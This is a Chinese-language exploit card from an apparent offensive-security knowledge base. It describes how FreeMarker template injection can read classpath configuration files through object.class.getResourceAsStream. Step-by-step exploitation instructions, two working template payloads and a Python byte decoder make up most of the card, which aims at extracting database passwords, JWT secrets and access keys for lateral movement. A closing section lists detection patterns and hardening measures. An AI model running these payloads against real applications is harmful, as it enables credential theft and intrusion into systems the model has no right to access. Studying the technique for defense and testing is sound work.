---
id: web-generic-ssti-freemarker-classpath-resource-read
title: FreeMarker SSTI 下用 object.class.getResourceAsStream 逐字节读取 classpath 配置
type: scenario
domain: web
path: web/generic/ssti
technique: freemarker-classpath-resource-read
aliases:
- FreeMarker 文件读取
- getResourceAsStream 读配置
- object.class 读 classpath
- FreeMarker 逐字节读取
- seq_contains 字符映射
- FreeMarker 读取 application.properties
tags:
- web
- ssti
- freemarker
- java
- file-read
- information-disclosure
- classpath
- apibuiltin
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V27
  verified_at: '2026-11-05T03:04:44+08:00'
  notes: 已对照原文与截图核对：object.class.getResourceAsStream 读 application.properties 的逐字节输出与脚本还原、seq_contains 字符映射、泄露 JDBC/root 口令截图均一致。未验证点：只能读 classpath 资源，不能读任意文件系统路径。
---

## 一句话结论

在 FreeMarker 模板注入中，即使 `?new` 被 SAFER_RESOLVER 拦截、`?api` 未开启，只要模板上下文暴露了任意 Java 对象（如 `object`），就能用 `object.class.getResourceAsStream('/application.properties')` 打开 classpath 资源，再通过 `<#list>` 循环逐字节 `read()` 输出；配合脚本或 `seq_contains` 字符映射可还原配置文件中的数据库口令、密钥等敏感信息。

## 原理

- FreeMarker 对模板上下文中的 Java 对象暴露 Bean 属性；`object.class` 可取得该对象的 `java.lang.Class`，`Class.getResourceAsStream(String)` 是按 classpath 查找资源的 JDK 方法，不需要 `?api`、也不需要 `?new` 实例化任何危险类。
- 该方法的参数是以 `/` 开头的 classpath 路径；常见可读目标包括 `/application.properties`、`/application.yml`、`/bootstrap.properties`、`/mapper/*.xml`、`/META-INF/...` 等。它不能直接读任意文件系统路径（如 `/etc/passwd`），但应用配置通常就在 classpath 中。
- 读取方式：`InputStream.read()` 返回下一个字节的 int（0-255），流结束返回 -1。模板用 `<#list 0..999999999 as _>` 制造循环，`<#assign byte=is.read()>`，`<#if byte == -1><#break></#if>` 终止，`${byte},` 输出十进制字节序列；攻击者用脚本把字节序列还原成文本。
- 当模板沙箱限制比较运算符（例如 `>`/`>=` 返回数字而不是布尔，导致 `<#if>` 不可用）时，可用 `?seq_contains`：预先构造 `65..90`（A-Z）、`97..122`（a-z）、`48..57`（0-9）等序列，`RU?seq_contains(b)` 返回布尔值，配合 `?substring` 把字节映射为字符，直接在模板中还原可读文本。
- 这条路径之所以成立，是因为 FreeMarker 的类/方法黑名单关注 `?new` 和 `?api`，没有阻止模板对上下文对象调用 `Class.getResourceAsStream` 这类“普通 getter/方法”。

## 触发条件

- 存在 FreeMarker 模板注入，攻击者可控制模板内容。
- 模板上下文暴露了任意 Java 对象（如 `object`、`user`、`request`），且 FreeMarker 未对其方法做严格白名单。
- 目标 classpath 中存在可预测路径的配置文件（Spring Boot 默认 `application.properties`/`application.yml`）。
- 模板允许 `<#list>`、`<#assign>`、`<#if>`、`?seq_contains`、`?substring` 等基础内建；`?new`/`?api` 可以关闭，不影响本手法。

## 利用步骤

1. 确认模板注入：提交 `${7*7}` 或 `${.version}` 观察回显。
2. 探测 `object` 是否可用：`${object.class}`、`${object.class.name}`；若报错，尝试上下文中的其他对象名。
3. 用 `object.class.getResourceAsStream('/application.properties')` 打开资源；若返回空，换 `/application.yml`、`/bootstrap.properties`、`/META-INF/application.properties` 等。
4. 用循环逐字节读取并输出十进制字节序列（见 PoC 1）。
5. 把字节序列交给脚本还原为文本；或使用 `seq_contains` 版本在模板内直接输出字母/数字（见 PoC 2）。
6. 从配置中提取数据库口令、Redis 密码、AK/SK、JWT secret 等，用于后续横向。

## PoC

PoC 1：逐字节输出（需要 `==` 比较可用）：

```text
<#assign is=object.class.getResourceAsStream('/application.properties')>
FILE:[<#list 0..999999999 as _>
    <#assign byte=is.read()>
    <#if byte == -1>
        <#break>
    </#if>
${byte}, </#list>]
```

```python
# 把响应中的 "10, 115, 112, ..." 还原为文本
nums = [int(x) for x in open("bytes.txt").read().split(",") if x.strip()]
print(bytes(nums).decode("utf-8", "replace"))
```

PoC 2：`seq_contains` 字符映射（比较运算符受限时）：

```text
<#assign U='ABCDEFGHIJKLMNOPQRSTUVWXYZ'>
<#assign L='abcdefghijklmnopqrstuvwxyz'>
<#assign D='0123456789'>
<#assign RU=65..90><#assign RL=97..122><#assign RD=48..57>
<#assign is=object.class.getResourceAsStream('/application.properties')>
<#list 0..999999999 as _>
    <#assign b=is.read()>
    <#if b == -1><#break></#if>
    <#if RU?seq_contains(b)>${U?substring(b-65, b-64)}</#if>
    <#if RL?seq_contains(b)>${L?substring(b-97, b-96)}</#if>
    <#if RD?seq_contains(b)>${D?substring(b-48, b-47)}</#if>
</#list>
```

```text
说明：PoC 2 只映射字母和数字，标点/换行会缺失；实际利用可扩展序列或结合分隔符定位。
```

## 变体与关联

- 变体：读取 `/application.yml`、`/bootstrap.properties`、`/logback-spring.xml`、`/mapper/*.xml`、`/META-INF/services/*` 等 classpath 资源。
- 变体：若模板可访问 `ClassLoader`，可用 `getResource`/`getResourceAsStream` 读取更多路径；`?api` 开启时可用 `getResourceAsStream` 的更多重载。
- 变体：盲读场景可用 `?seq_contains` 做字符集二分/逐字符判断，或通过错误信息/响应长度侧信道。
- 关联卡片：[[web-generic-ssti-freemarker-safer-resolver-bypass]]（同一注入面下的 RCE 绕过）；[[web-java-component-jimureport-freemarker-jeecg-compute-aviator-rce]]（业务暴露方法导致的 SSTI RCE）；[[web-java-framework-spring-freemarker-macro-context-resolver-reset]]（Spring 暴露对象的沙箱逃逸）。
- 边界：`object` 不在上下文、FreeMarker 对 `Class` 方法做白名单、classpath 无目标文件或配置已外置到环境变量/密钥管理系统时，读取失败或收益降低；本手法通常不能直接读任意绝对路径。

## 检测与防御

- 检测：模板/请求中出现 `getResourceAsStream`、`object.class`、`application.properties`、`?seq_contains`、长时间 `<#list>` 与大量十进制字节输出；响应中出现形如 `10, 115, 112, ...` 的字节序列。
- 防御：不要向模板暴露任意 Java 对象，使用 `TemplateModel` 包装并限制可调用方法；FreeMarker 配置 `ALLOWS_NOTHING_RESOLVER`、关闭 `api_builtin_enabled`；升级 FreeMarker；对模板做 AST 级检查，拒绝 `getResourceAsStream`、`?api`、`?new`。
- 加固：敏感配置改用环境变量/密钥管理服务，避免明文放在 classpath；限制应用进程读取敏感文件；WAF 阻断模板中的 `getResourceAsStream`/`object.class` 组合；对模板渲染接口做鉴权与输入白名单。
